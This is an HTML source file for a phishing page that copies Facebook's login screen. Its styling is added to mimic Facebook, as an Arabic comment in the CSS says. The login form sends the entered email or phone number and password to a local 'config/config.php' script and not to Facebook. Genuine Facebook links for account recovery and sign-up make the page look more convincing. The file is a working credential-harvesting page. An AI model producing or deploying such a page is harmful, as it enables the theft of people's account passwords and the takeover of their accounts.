<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#3b5998">
    <title>Facebook – log in or sign up</title>
    <link rel="shortcut icon" href="img/favicon3.ico" type="image/x-icon">
    <link rel="stylesheet" href="css/mobile.css">
    <link rel="stylesheet" href="css/pc.css">
    <link rel="stylesheet" href="css/responsive.css">
    <style>
        /* إضافة بعض التنسيقات لتشبه صفحة فيسبوك */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            display: flex;
            justify-content: space-between;
            width: 100%;
            max-width: 980px;
            background-color: white;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        .content-left {
            flex: 1;
            padding-right: 20px;
        }
        .content-right {
            flex: 1;
            padding-left: 20px;
            border-left: 1px solid #ddd;
        }
        .logo-part img {
            width: 150px;
        }
        .content-left h2 {
            font-size: 24px;
            margin-top: 20px;
            color: #333;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        .login {
            margin-top: 20px;
        }
        .login input {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .forgot {
            text-align: center;
            margin-top: 10px;
        }
        .forgot a {
            color: #1877f2;
            text-decoration: none;
        }
        .line {
            margin: 15px 0;
            border-top: 1px solid #ddd;
        }
        .create-btn a {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #42b72a;
            color: white;
            text-align: center;
            border-radius: 5px;
            font-size: 16px;
            text-decoration: none;
        }
        .create-btn a:hover {
            background-color: #36a420;
        }
        p {
            font-size: 14px;
            text-align: center;
            margin-top: 10px;
        }
        p a {
            color: #1877f2;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Left Content -->
        <div class="content-left">
            <div class="logo-part">
                <img src="img/logo.svg" alt="Facebook">
            </div>
            <h2>Facebook helps you connect and share with the people in your life.</h2>
        </div>
        <!-- Right Content (Form) -->
        <div class="content-right">
            <form action="config/config.php">
                <div class="form-group">
                    <input type="text" name="email" autocomplete="off" required placeholder="Email address or phone number">
                </div>
                <div class="form-group">
                    <input type="password" name="password" autocomplete="off" required placeholder="Password">
                </div>
                <div class="login">
                    <input type="submit" class="btn" value="Log In">
                </div>
                <div class="forgot">
                    <a href="https://www.facebook.com/login/identify/">Forgotten account?</a>
                </div>
                <div class="line"></div>
                <div class="create-btn">
                    <a href="https://www.facebook.com/reg/" class="btn">Create New Account</a>
                </div>
            </form>
            <p><a href="https://www.facebook.com/pages/create/">Create a Page</a> for a celebrity, band or business.</p>
        </div>
    </div>
</body>
</html>
